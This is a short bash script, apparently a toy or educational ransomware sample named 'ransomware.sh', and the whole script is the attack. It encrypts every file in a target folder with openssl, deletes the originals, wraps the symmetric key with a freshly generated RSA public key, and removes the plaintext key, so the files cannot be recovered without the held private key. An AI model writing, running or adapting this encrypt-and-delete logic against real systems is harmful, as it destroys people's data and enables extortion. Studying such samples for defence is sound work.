#!bin/bash

simetric_key=$(uuid)
echo $simetric_key > simetric.key

root="/temp/folder"

for file in $(ls $root);
do
	if [ "$file" != "ransomware.sh" ] && [ "$file" != "simetric.key" ];
	then
		openssl enc -aes256 -k $simetric_key -a -e -in $root/$file -out $root/$file.enc
		rm -rf $root/$file	
	fi	
done

openssl genrsa -out private.pem 4096

openssl rsa -in private.pem -outform PEM -pubout -out public.pem

openssl rsautl -in simetric.key -out simetric.enc -encrypt -pubin -inkey public.pem

rm -rf simetric.key

cp private.pem /root/

rm -rf private.pem
